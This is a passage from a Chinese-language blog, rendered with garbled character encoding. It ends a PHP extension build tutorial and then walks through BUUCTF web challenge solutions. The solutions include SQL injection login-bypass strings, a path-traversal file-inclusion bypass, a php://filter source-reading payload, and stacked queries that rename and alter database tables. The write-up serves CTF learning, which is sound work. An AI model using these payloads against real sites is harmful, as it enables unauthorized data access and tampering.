class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_HELLOWORD</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(helloword)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="ğŸ”ºæ³¨ï¼š-1"   >
          <a href="#ğŸ”ºæ³¨ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š-1" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h2>
      <p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨php7.3ä»¥ä¸Šï¼Œ<code>ext_skel</code>è¿™ä¸ªshellå˜æˆäº†<code>ext_skel.php</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹æ¥åˆ›å»º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/73/bin/php ./ext_skel.php --ext helloword</span><br><span class="line">/www/server/php/73/bin/phpize</span><br><span class="line">./configure --prefix=/www/server/php/73/bin/php --with-php-config=/www/server/php/73/bin/php-config</span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-åŠ è½½æ¨¡å—"   >
          <a href="#3-åŠ è½½æ¨¡å—" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åŠ è½½æ¨¡å—" class="headerlink" title="3.åŠ è½½æ¨¡å—"></a>3.åŠ è½½æ¨¡å—</h2>
      
        <h3 id="æ–¹æ³•ä¸€ï¼š"   >
          <a href="#æ–¹æ³•ä¸€ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3>
      <p>ç›´æ¥<code>make install</code>ï¼Œç„¶ååœ¨å¯¹åº”çš„php.iniä¸­æ·»åŠ <code>extension=helloword.so</code></p>

        <h3 id="æ–¹æ³•äºŒï¼š"   >
          <a href="#æ–¹æ³•äºŒï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3>
      <p>å¤åˆ¶modulesä¸‹çš„helloworld.soæ¨¡å—åˆ°å¯¹åº”çš„phpæ‰©å±•ç›®å½•</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./modules/helloword.so /www/server/php/73/lib/php/extensions/no-debug-non-zts-20180731/</span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·ä¹Ÿå¾—åœ¨php.iniä¸­æ·»åŠ extension</p>
<p>ä¹‹åä½¿ç”¨æ¨¡æ¿ä¸­å‡½æ•°æµ‹è¯•å³å¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">helloword_test1();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹å³å¯æˆåŠŸ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101910792.png"></p>
<p>è¿™ä¸ªphpæ‹“å±•æ¨¡å—å…¶å®è·Ÿlinuxå†…æ ¸æœ‰ç‚¹åƒ</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98(%E4%B8%80)/">é™ªXXçš„WebBUUåˆ·é¢˜(ä¸€)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€EasySQL"   >
          <a href="#ä¸€ã€EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€EasySQL" class="headerlink" title="ä¸€ã€EasySQL"></a>ä¸€ã€EasySQL</h1>
      
        <h2 id="ğŸ”ºSQLæ³¨å…¥ç™»å½•"   >
          <a href="#ğŸ”ºSQLæ³¨å…¥ç™»å½•" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºSQLæ³¨å…¥ç™»å½•" class="headerlink" title="ğŸ”ºSQLæ³¨å…¥ç™»å½•"></a>ğŸ”ºSQLæ³¨å…¥ç™»å½•</h2>
      <p>ç®€å•çš„SQLæ³¨å…¥</p>

        <h2 id="1-æŸ¥çœ‹ç½‘é¡µæºä»£ç "   >
          <a href="#1-æŸ¥çœ‹ç½‘é¡µæºä»£ç " class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æŸ¥çœ‹ç½‘é¡µæºä»£ç " class="headerlink" title="1.æŸ¥çœ‹ç½‘é¡µæºä»£ç "></a>1.æŸ¥çœ‹ç½‘é¡µæºä»£ç </h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346044.png" alt="image-20220106105755040"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯check.phpåœ¨å¯¹ç™»å½•æŒ‰é’®è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨çš„æ–¹æ³•æ˜¯GETï¼ŒåŠ ä¸Šé¢˜ç›®æç¤ºæ˜¯SQLæ³¨å…¥ï¼Œæ‰€ä»¥å°±ç›´æ¥å°è¯•SQLæ³¨å…¥ã€‚</p>

        <h2 id="2-æ³¨å…¥åŸç†"   >
          <a href="#2-æ³¨å…¥åŸç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ³¨å…¥åŸç†" class="headerlink" title="2.æ³¨å…¥åŸç†"></a>2.æ³¨å…¥åŸç†</h2>
      <p>ç”±äºSQLæ³¨å…¥ä¸­æ¶‰åŠå•å¼•å·å’ŒåŒå¼•å·ï¼Œä¸”å¯¹å­—ç¬¦ä¸²çš„å¤„ç†åŸºæœ¬éƒ½æ˜¯å•å¼•å·è¿›è¡Œå¤„ç†ï¼Œæ£€æµ‹ä¸€ä¸‹ï¼Œå€˜è‹¥æˆ‘ä»¬ä½¿ç”¨åŒå¼•å·è¿›è¡Œæ³¨å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=aaa&#x27; or &quot;1&quot;=&quot;1&amp;password=aaa&#x27; or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå‡ºç°å¦‚ä¸‹é”™è¯¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346998.png" alt="image-20220106110800649"></p>
<p>é‚£ä¹ˆé‡‡ç”¨å•å¼•å·è¿›è¡Œæ³¨å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=aaa&#x27; or &#x27;1&#x27;=&#x27;1&amp;password=aaa&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åå³å¯æˆåŠŸ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061423772.png" alt="image-20220106142353692"></p>

        <h1 id="äºŒã€-HCTF-2018-WarmUp"   >
          <a href="#äºŒã€-HCTF-2018-WarmUp" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€-HCTF-2018-WarmUp" class="headerlink" title="äºŒã€[HCTF 2018]WarmUp"></a>äºŒã€[HCTF 2018]WarmUp</h1>
      
        <h2 id="ğŸ”ºæ–‡ä»¶åŒ…å«æ¼æ´"   >
          <a href="#ğŸ”ºæ–‡ä»¶åŒ…å«æ¼æ´" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="ğŸ”ºæ–‡ä»¶åŒ…å«æ¼æ´"></a>ğŸ”ºæ–‡ä»¶åŒ…å«æ¼æ´</h2>
      <p>æç¤ºæœ‰<code>source.php</code>ï¼Œè®¿é—®ä¸€ä¸‹çœ‹åˆ°æºç ï¼Œä»£ç å®¡è®¡</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>å³<code>emmm::checkFile</code>å‡½æ•°è¿”å›<code>True</code>å¯ä»¥è§¦å‘æ–‡ä»¶åŒ…å«ï¼Œè¿™é‡Œç®€å•è°ƒè¯•ä¸€ä¸‹å°±çŸ¥é“ï¼Œç”±äº<code>mb_substr</code>å’Œ<code>mb_strpos</code>çš„ä½¿ç”¨ï¼Œå¯¼è‡´å¯ä»¥ç”¨<code>file=source.php?xxxxx</code>æ¥è¿›è¡Œç»•è¿‡æ£€æµ‹ã€‚</p>
<p>å³æœ€ç»ˆå¯ä»¥æ‰§è¡Œåˆ°<code>include(&quot;source.php?xxxxx&quot;)</code></p>
<p>ç„¶åæŸ¥çœ‹<code>hint.php</code>ï¼Œå‘ç°<code>flag</code>ä¸º<code>ffffllllaaaagggg</code>ï¼Œé‚£ä¹ˆå³å¯è§¦å‘æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ‰§è¡Œä»£ç <code>include(&quot;source.php?../../../../../../ffffllllaaaagggg&quot;)</code></p>
<p>è¿™é‡Œæ¯”è¾ƒæœ‰æ„æ€çš„ä¸€ç‚¹æ˜¯å¯¹äº<code>include</code>å‡½æ•°çš„ä½¿ç”¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;xxxx.php?../../flag&quot;);</span><br><span class="line">include(&quot;xxxx.php../../flag&quot;);</span><br></pre></td></tr></table></div></figure>

<p>ä¸¤ä¸ªç±»ä¼¼çš„ä»£ç ï¼Œä¸€ä¸ªæœ‰<code>?</code>ï¼Œä¸€ä¸ªæ²¡æœ‰ï¼Œç„¶ååœ¨<code>Linux</code>ç¯å¢ƒä¸‹ï¼Œè¿™ä¸¤ä¸ªä»£ç éƒ½ä»£è¡¨åŒ…å«å½“å‰ç›®å½•ä¸‹çš„<code>flag</code>ï¼Œä½†æ˜¯åœ¨<code>Windows</code>ç¯å¢ƒä¸‹ï¼Œæœ‰<code>?</code>çš„æ‰§è¡Œä¸æˆåŠŸï¼Œæ²¡æœ‰çš„å¯ä»¥æ‰§è¡ŒæˆåŠŸï¼Œæœ‰ç‚¹ç¦»è°±ã€‚</p>
<p>å½“ç„¶ï¼Œè¿™ä¸ª<code>xxxx.php</code>æ¢æˆå…¶ä»–å­—ç¬¦éƒ½å¯ä»¥ã€‚</p>

        <h1 id="ä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Havefun1"   >
          <a href="#ä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Havefun1" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Havefun1" class="headerlink" title="ä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun1"></a>ä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun1</h1>
      
        <h2 id="ğŸ”ºç®€å•æŸ¥è¯¢"   >
          <a href="#ğŸ”ºç®€å•æŸ¥è¯¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºç®€å•æŸ¥è¯¢" class="headerlink" title="ğŸ”ºç®€å•æŸ¥è¯¢"></a>ğŸ”ºç®€å•æŸ¥è¯¢</h2>
      <p>æŸ¥çœ‹æºä»£ç ï¼Œè·³è¿‡csså’Œstyleéƒ¨åˆ†</p>
<p>å¯ä»¥çœ‹åˆ°æ³¨é‡Šéƒ¨åˆ†çš„æç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071147850.png" alt="image-20220107114730804"></p>
<p>å³å½“cat=dogæ—¶ï¼Œå°±ä¼šè¾“å‡ºSyc{cat_cat_cat}ï¼Œä½†æ˜¯ä¸€èˆ¬è¿™éƒ½æ˜¯ä½œè€…ç»™çš„æç¤ºï¼Œå®é™…è¾“å‡ºå†…å®¹å¯èƒ½ä¸æ˜¯Syc{cat_cat_cat}ï¼Œæ‰€ä»¥å…ˆå°è¯•ä¸€æ³¢</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/index.php?cat=dog</span><br></pre></td></tr></table></div></figure>

<p>ç›´æ¥å‡ºflagäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071149004.png" alt="image-20220107114926958"></p>

        <h1 id="å››ã€-ACTF2020-æ–°ç”Ÿèµ›-Include"   >
          <a href="#å››ã€-ACTF2020-æ–°ç”Ÿèµ›-Include" class="heading-link"><i class="fas fa-link"></i></a><a href="#å››ã€-ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="å››ã€[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>å››ã€[ACTF2020 æ–°ç”Ÿèµ›]Include</h1>
      
        <h2 id="ğŸ”ºPHPä¼ªåè®®"   >
          <a href="#ğŸ”ºPHPä¼ªåè®®" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºPHPä¼ªåè®®" class="headerlink" title="ğŸ”ºPHPä¼ªåè®®"></a>ğŸ”ºPHPä¼ªåè®®</h2>
      
        <h2 id="1-å‰ç½®æ¢ç´¢"   >
          <a href="#1-å‰ç½®æ¢ç´¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®æ¢ç´¢" class="headerlink" title="1.å‰ç½®æ¢ç´¢"></a>1.å‰ç½®æ¢ç´¢</h2>
      <p>ç‚¹å‡»tipsä¹‹åå‘ç°è¾“å‡ºæç¤ºï¼Œè·å–åˆ°ä½¿ç”¨fileåè®®çš„flag.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071209055.png" alt="image-20220107120937019"></p>
<p>æŸ¥çœ‹flag.phpçš„ç½‘é¡µæºä»£ç ä½†æ˜¯ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071210256.png" alt="image-20220107121010226"></p>
<p>ä¹‹åå°è¯•åˆ©ç”¨phpçš„ä¼ªåè®®æ¥è¯»å–flag.phpçš„æºä»£ç </p>

        <h2 id="2-phpä¼ªåè®®åˆ©ç”¨"   >
          <a href="#2-phpä¼ªåè®®åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpä¼ªåè®®åˆ©ç”¨" class="headerlink" title="2.phpä¼ªåè®®åˆ©ç”¨"></a>2.phpä¼ªåè®®åˆ©ç”¨</h2>
      <p>è¿™ä¸ªæ¯”è¾ƒå¤æ‚ï¼Œä¹‹åå†ä¸“é—¨æ€»ç»“ä¸€ä¸‹ï¼Œåæ­£è¿™é‡Œæ¶‰åŠäº†fileï¼Œé‚£ä¹ˆå°è¯•ç”¨è¯¥åè®®çš„payloadæ¥è¯»å–</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œç»™å‡ºçš„æ˜¯æ¯”è¾ƒæ™®éæ€§çš„ï¼Œç”¨base64æ¥è¿›è¡Œè·å–çš„ï¼Œè¯»å–ä¹‹åå¾—åˆ°base64ç¼–ç çš„ä¸€ä¸²å­—ç¬¦</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071216007.png" alt="image-20220107121629962"></p>

        <h2 id="3-base64è§£ç "   >
          <a href="#3-base64è§£ç " class="heading-link"><i class="fas fa-link"></i></a><a href="#3-base64è§£ç " class="headerlink" title="3.base64è§£ç "></a>3.base64è§£ç </h2>
      <p>è·å–åˆ°ä¸Šé¢çš„base64ç¼–ç åï¼Œè¿ç”¨CyberChefè§£ç å³å¯å¾—åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071218337.png" alt="image-20220107121805266"></p>

        <h1 id="äº”ã€-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨1"   >
          <a href="#äº”ã€-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨1" class="heading-link"><i class="fas fa-link"></i></a><a href="#äº”ã€-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨1" class="headerlink" title="äº”ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1"></a>äº”ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1</h1>
      
        <h2 id="ğŸ”ºSQLæ³¨å…¥-ä¸‰ç§å§¿åŠ¿"   >
          <a href="#ğŸ”ºSQLæ³¨å…¥-ä¸‰ç§å§¿åŠ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºSQLæ³¨å…¥-ä¸‰ç§å§¿åŠ¿" class="headerlink" title="ğŸ”ºSQLæ³¨å…¥+ä¸‰ç§å§¿åŠ¿"></a>ğŸ”ºSQLæ³¨å…¥+ä¸‰ç§å§¿åŠ¿</h2>
      <p>å¯ä»¥å…ˆç”¨å•å¼•å·åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;</span><br></pre></td></tr></table></div></figure>

<p>å‡ºç°å¦‚ä¸‹ï¼Œå‡ºé”™åˆ™ä»£è¡¨å­˜åœ¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071253029.png" alt="image-20220107125314983"></p>
<p>é‚£ä¹ˆå…ˆæŸ¥è¯¢å­˜åœ¨çš„è¡¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show tables;#</span><br></pre></td></tr></table></div></figure>

<p>å‘ç°æœ‰å¦‚ä¸‹ä¸¤ä¸ªè¡¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071623241.png" alt="image-20220107162320203"></p>
<p>ç„¶ååˆ†åˆ«æŸ¥çœ‹ä¸€ä¸‹å¯¹åº”çš„</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show columns from words;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629819.png" alt="image-20220107162923778"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629659.png" alt="image-20220107162957623"></p>
<p>é‚£ä¹ˆflagå°±åœ¨è¡¨1919810931114514ä¸­ï¼Œæ³¨æ„æŸ¥è¯¢æ•°å­—è¡¨çš„æ—¶å€™éœ€è¦åŠ <strong>åå¼•å·`</strong></p>

        <h2 id="è§£æwordsè¡¨"   >
          <a href="#è§£æwordsè¡¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æwordsè¡¨" class="headerlink" title="è§£æwordsè¡¨"></a>è§£æwordsè¡¨</h2>
      <p>é‚£ä¹ˆç”±äºè¾“å…¥1ï¼Œ2ä¼šå‡ºç°å¦‚ä¸‹æ•°æ®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642873.png" alt="image-20220107164211829"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642355.png" alt="image-20220107164221323"></p>
<p>è¿™é‡Œçš„ç¬¬äºŒä¸ªæ•°æ®æ®µæ˜¯å­—ç¬¦å‹ï¼Œé‚£ä¹ˆå°±åº”è¯¥æ˜¯åœ¨è¡¨wordsä¸­ï¼Œæ­¤æ—¶å°±å¤§æ¦‚æ˜¯å¦‚ä¸‹çš„è¡¨æ ¼</p>
<div class="table-container"><table>
<thead>
<tr>
<th>id</th>
<th>data</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>hahahah</td>
</tr>
<tr>
<td>2</td>
<td>miaomiaomiao</td>
</tr>
</tbody></table></div>

        <h2 id="è§£æ1919810931114514è¡¨"   >
          <a href="#è§£æ1919810931114514è¡¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ1919810931114514è¡¨" class="headerlink" title="è§£æ1919810931114514è¡¨"></a>è§£æ<code>1919810931114514</code>è¡¨</h2>
      <p>ä¾æ®åˆ—å¤§æ¦‚çŒœæµ‹å¦‚ä¸‹</p>
<div class="table-container"><table>
<thead>
<tr>
<th>flag</th>
</tr>
</thead>
<tbody><tr>
<td>â€¦â€¦â€¦..ä¸çŸ¥</td>
</tr>
</tbody></table></div>
<p>è¿™é‡Œselectè¢«è¿‡æ»¤äº†ï¼Œæ— æ³•ç›´æ¥ä»è¡¨1919810931114514ä¸­è·å–æ‰€ä»¥å°è¯•ä¸€ä¸‹å…¶ä»–çš„è§£æ³•ã€‚</p>

        <h2 id="1-è§£æ³•ä¸€-æ”¹è¡¨"   >
          <a href="#1-è§£æ³•ä¸€-æ”¹è¡¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è§£æ³•ä¸€-æ”¹è¡¨" class="headerlink" title="1.è§£æ³•ä¸€(æ”¹è¡¨)"></a>1.è§£æ³•ä¸€(æ”¹è¡¨)</h2>
      <p>ä¿®æ”¹è¡¨åå­—ï¼Œä½¿å¾—ä¿å­˜flagçš„è¡¨1919810931114514åå­—å˜ä¸ºè¡¨wordsï¼Œä¹‹åæŠŠflagå­—æ®µå˜ä¸ºdataå­—æ®µï¼Œæ·»åŠ idå­—æ®µï¼Œè¾“å…¥1,2ç„¶åå°±å¯ä»¥æ‰“å°å‡ºflagäº†ã€‚</p>

        <h3 id="1-æ”¹å"   >
          <a href="#1-æ”¹å" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ”¹å" class="headerlink" title="(1)æ”¹å"></a>(1)æ”¹å</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; rename table words to word1; rename table `1919810931114514` to words;#</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å¢æ·»idå­—æ®µ"   >
          <a href="#2-å¢æ·»idå­—æ®µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¢æ·»idå­—æ®µ" class="headerlink" title="(2)å¢æ·»idå­—æ®µ"></a>(2)å¢æ·»idå­—æ®µ</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; alter table words add id int unsigned not Null auto_increment primary key;#</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-ä¿®æ”¹flagä¸ºdataå­—æ®µ"   >
          <a href="#3-ä¿®æ”¹flagä¸ºdataå­—æ®µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä¿®æ”¹flagä¸ºdataå­—æ®µ" class="headerlink" title="(3)ä¿®æ”¹flagä¸ºdataå­—æ®µ"></a>(3)ä¿®æ”¹flagä¸ºdataå­—æ®µ</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;;alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></div></figure>


        <h3 id="æ€»çš„payload"   >
